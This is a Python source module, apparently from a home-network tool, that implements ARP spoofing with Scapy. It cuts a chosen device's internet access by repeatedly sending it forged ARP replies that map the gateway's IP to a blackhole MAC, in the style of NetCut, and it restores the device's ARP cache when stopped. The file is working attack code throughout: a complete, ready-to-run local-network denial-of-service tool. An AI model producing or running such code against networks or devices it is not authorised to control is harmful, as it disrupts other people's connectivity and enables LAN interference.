"""
ARP Spoofer — cuts internet access for a device using ARP poisoning.
Runs ARP spoof in a background thread per target device.
CRITICAL: stop_spoof() must be called on shutdown to restore ARP caches.
"""
import threading
import time
import logging
from typing import Dict
from backend.utils.mac_utils import normalize_mac

logger = logging.getLogger("roost.arp_spoofer")

# Active spoof threads: mac_address -> (thread, stop_event)
_active: Dict[str, tuple] = {}
_lock = threading.Lock()


def _spoof_loop(target_ip: str, target_mac: str, gateway_ip: str,
                gateway_mac: str, own_mac: str, iface,
                stop_event: threading.Event):
    """Thread: sends ARP poison packets every 1.5s until stop_event is set."""
    try:
        from scapy.layers.l2 import Ether, ARP
        from scapy.sendrecv import sendp

        src = own_mac.upper().replace("-", ":").replace(".", ":")

        # Best-practice block (NetCut-style):
        # Tell the TARGET that the gateway's MAC is a non-existent "blackhole"
        # address. The target then sends all outbound traffic to a MAC that
        # belongs to no device — traffic is silently dropped by the switch.
        #
        # We do NOT touch the gateway's ARP table at all, so:
        #   - Our laptop's internet is completely unaffected
        #   - The router never sees a duplicate MAC for two IPs
        #   - Only the target device loses internet access
        BLACKHOLE = "de:ad:be:ef:de:ad"
        pkt_to_target = (
            Ether(src=src, dst=target_mac) /
            ARP(op=2, hwsrc=BLACKHOLE, pdst=target_ip, psrc=gateway_ip)
        )

        while not stop_event.is_set():
            try:
                kwargs: dict = dict(verbose=False)
                if iface:
                    kwargs["iface"] = iface
                sendp(pkt_to_target, **kwargs)
            except Exception as e:
                logger.debug(f"ARP send error (non-fatal): {e}")
            time.sleep(1.5)

        # Restore: send correct ARP to undo poisoning
        _restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, own_mac, iface)

    except Exception as e:
        logger.error(f"ARP spoof thread error: {e}", exc_info=True)


def _restore_arp(target_ip: str, target_mac: str, gateway_ip: str,
                 gateway_mac: str, own_mac: str, iface):
    """Send gratuitous ARP to restore correct MAC mappings."""
    try:
        from scapy.layers.l2 import Ether, ARP
        from scapy.sendrecv import sendp

        # Restore target's ARP cache: tell it the real gateway MAC
        restore_target = (
            Ether(src=gateway_mac, dst=target_mac) /
            ARP(op=2, hwsrc=gateway_mac, hwdst=target_mac,
                psrc=gateway_ip, pdst=target_ip)
        )

        kwargs: dict = dict(count=3, verbose=False)
        if iface:
            kwargs["iface"] = iface
        # Send several spaced bursts so at least one wins the race against the
        # poison packets still in flight and reliably repairs the target's cache.
        for _ in range(4):
            sendp(restore_target, **kwargs)
            time.sleep(0.25)
        logger.info(f"ARP restored for {target_ip}")
    except Exception as e:
        logger.warning(f"ARP restore failed for {target_ip}: {e}")


def start_spoof(target_ip: str, target_mac: str) -> bool:
    """
    Start ARP spoofing for a target device. Returns True if started.
    NOTE: call this from a thread (e.g. run_in_executor) — _get_mac does
    blocking Scapy I/O which must not run on the async event loop.
    """
    mac = normalize_mac(target_mac)
    with _lock:
        if mac in _active:
            logger.debug(f"Already spoofing {mac}")
            return True

        try:
            from backend.services.network_info import get_network_info
            from backend.services.arp_scanner import _resolve_scapy_iface
            net = get_network_info()

            # Safety: never spoof the gateway or our own device
            if target_ip == net.gateway_ip or target_ip == net.own_ip:
                logger.warning(f"Refusing to spoof gateway/own IP: {target_ip}")
                return False

            # Resolve the correct Scapy interface object (same logic as scanner)
            resolved_iface = _resolve_scapy_iface(net.interface, net.own_ip)

            # Get gateway MAC via ARP (uses explicit src MAC to avoid loopback bug)
            gateway_mac = _get_mac(net.gateway_ip, resolved_iface, own_mac=net.own_mac)
            if not gateway_mac:
                logger.error(
                    f"Cannot get gateway MAC for {net.gateway_ip} — "
                    "ensure Npcap is installed and running as Administrator"
                )
                return False

            stop_event = threading.Event()
            thread = threading.Thread(
                target=_spoof_loop,
                args=(target_ip, mac, net.gateway_ip, gateway_mac,
                      net.own_mac, resolved_iface, stop_event),
                daemon=True,
                name=f"spoof-{mac}",
            )
            thread.start()
            _active[mac] = (thread, stop_event)
            logger.info(f"ARP spoof started: {mac} @ {target_ip}")
            return True
        except Exception as e:
            logger.error(f"start_spoof failed: {e}", exc_info=True)
            return False


def stop_spoof(target_mac: str) -> bool:
    """Stop ARP spoofing for a device and restore its ARP cache."""
    mac = normalize_mac(target_mac)
    with _lock:
        if mac not in _active:
            return False
        thread, stop_event = _active.pop(mac)
        stop_event.set()
    thread.join(timeout=5)
    logger.info(f"ARP spoof stopped: {mac}")
    return True


def stop_all_spoofs():
    """Stop all active ARP spoof threads. Call on application shutdown."""
    macs = list(_active.keys())
    logger.info(f"Stopping all {len(macs)} ARP spoof threads...")
    for mac in macs:
        stop_spoof(mac)


def is_spoofing(target_mac: str) -> bool:
    mac = normalize_mac(target_mac)
    return mac in _active


def _get_mac(ip: str, iface, own_mac: str = "") -> str:
    """
    Get MAC address for an IP via ARP request.
    Uses explicit src MAC to avoid conf.iface loopback-adapter bug on Windows.
    """
    try:
        from scapy.layers.l2 import Ether, ARP
        from scapy.sendrecv import srp

        src = own_mac.upper().replace("-", ":").replace(".", ":") if own_mac else None
        if src:
            pkt = Ether(src=src, dst="ff:ff:ff:ff:ff:ff") / ARP(hwsrc=src, pdst=ip)
        else:
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)

        kwargs: dict = dict(timeout=3, verbose=False)
        if iface:
            kwargs["iface"] = iface
        answered, _ = srp(pkt, **kwargs)
        if answered:
            return normalize_mac(answered[0][1].hwsrc)
        return ""
    except Exception as e:
        logger.warning(f"_get_mac({ip}) failed: {e}")
        return ""
